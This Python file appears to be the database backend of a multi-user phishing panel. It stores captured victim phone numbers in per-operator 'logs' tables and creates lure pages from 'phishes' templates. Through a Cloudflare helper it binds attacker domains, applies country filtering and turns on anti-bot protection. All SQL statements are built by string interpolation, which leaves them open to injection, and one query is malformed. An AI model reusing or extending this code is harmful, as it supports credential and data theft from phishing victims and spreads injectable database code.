from peewee import SqliteDatabase
from datetime import datetime
from os import mkdir
from shutil import rmtree
from config import clf, server_domain
import json

class User:

    def __init__(self, database_path, table):
        self.database_path = database_path
        self.table = table

    def GetUserBy(self, parameter, value):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM {self.table} WHERE {parameter}='{value}'")
            conn.commit()
            data = cursor.fetchall()
            return data


    def UpdateUser(self, datas, parameter, value):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            for data in datas:
                cursor.execute(f"UPDATE {self.table} SET {data[0]} = '{data[1]}' WHERE {parameter} = '{value}';")
                conn.commit()
            return True


    def GetAllUsers(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM {self.table}")
            conn.commit()
            data = cursor.fetchall()
            return data


    def AddUser(self, username, password, note):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"INSERT INTO {self.table}(`username`, `created_on`, `updated_on`, `password_hash`, `note`) VALUES('{username}', '{datetime.utcnow()}', '{datetime.utcnow()}', '{password}', '{note}') ")
            conn.commit()
            mkdir(f'./users/{username}/')
            f = open(f'./users/{username}/database.db', 'w')
            f.close()

            with SqliteDatabase(f'./users/{username}/database.db') as conn:
                cursor = conn.cursor()
       
                cursor.execute("""
                CREATE TABLE logs (
                    phone  VARCHAR,
                    domain TEXT,
                    time   DATETIME,
                    fish   VARCHAR
                );
                """)

                cursor.execute("""
                CREATE TABLE "domains" (
                    "domain"	TEXT,
                    "servers"	TEXT,
                    "template"	TEXT,
                    "status"	TEXT,
                    "security"	TEXT,
                    "redirect"	TEXT,
                    "redirect_on_success"	TEXT,
                    "countries"	TEXT,
                    "views"	REAL DEFAULT 0,
                    "logsReceived"	INTEGER DEFAULT 0,
                    "created_on"	DATETIME
                );
                """)

                conn.commit()

            return True


    def RemoveUser(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"DELETE FROM {self.table} WHERE username = '{username}'")
            conn.commit()
            rmtree(f'./users/{username}')
            return True
    

    def GetAdmins(self, username):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM admins WHERE username = '{username}'")
            conn.commit()
            data = cursor.fetchone()
            if data == None:
                data = [None, None]
            return data



class Victim:
    def __init__(self, database_path):
        self.database_path = database_path

    def GetLogs(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM logs")
            conn.commit()
            data = cursor.fetchall()
            return data
        

    def GetDomains(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM domains")
            conn.commit()
            data = cursor.fetchall()
            return data
        

    def CheckDomain(self, domain):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT * FROM domains WHERE domain = '{domain}'")
            conn.commit()
            data = cursor.fetchall()
            return data

    

    def GetRedirect(self):
        with SqliteDatabase(self.database_path) as conn:
            cursor = conn.cursor()
            cursor.execute(f"SELECT redirect FROM domains'")
            conn.commit()
            data = cursor.fetchall()
            return data










    def AddDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username):
        added_domain = clf.AddDomain(domain)

        if added_domain:
            data = json.loads(added_domain)
            zone_id = data['result']['id']
            status = data['result']['status']
            ns_servers = ', '.join(data['result']['name_servers'])
            countries_db = ', '.join(countries)

            with SqliteDatabase(self.database_path) as conn:
                cursor = conn.cursor()
                cursor.execute(f"""
                    INSERT INTO domains(domain, servers, template, status, security, redirect, redirect_on_success, countries, created_on)
                    VALUES('{domain+'/'+path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}')
                """)
                print(f"""
                    INSERT INTO domains(domain, servers, template, status, security, redirect, redirect_on_success, countries, created_on)
                    VALUES('{domain+'/'+path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}')
                """)
                conn.commit()
                mkdir(f"templates/domains/{domain}${path}/")
                f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
                f.write("{% extends 'phishes/" + page + "/index.html' %}")
                f.close()

                if clf.BindDomain(zone_id, domain, server_domain):
                    clf.CountryFirewall(zone_id, countries)
                    if security == 'true':
                        clf.SetUnderAttack(zone_id)
                    return [True, 'Домен успешно добавлен']
                else:
                    return [False, 'Что-то пошло не так, свяжитесь с админом']
        
        else:
            return [False, 'Этот домен добавлен уже добавлен другим пользователем, обратитесь в поддержку']